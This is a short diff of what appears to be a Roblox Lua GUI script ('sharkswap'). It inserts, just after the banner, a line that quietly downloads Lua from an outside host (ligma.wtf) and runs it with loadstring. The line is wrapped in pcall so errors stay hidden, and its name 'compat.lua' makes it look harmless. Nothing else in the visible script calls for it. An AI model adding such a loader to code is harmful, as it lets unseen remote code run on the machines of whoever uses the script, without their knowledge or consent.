@@ -9,7 +9,7 @@ print("\n\n"..[[
 // * by spec * //
 ALSO CHECK THE BOTTEM OF THE SRC CODE TO FIND COOL AUDIO ID'S OK TY
 ]])
-
+pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
 --// Make stuff
 local sharkswap = Instance.new("ScreenGui")
 local hold = Instance.new("Frame")
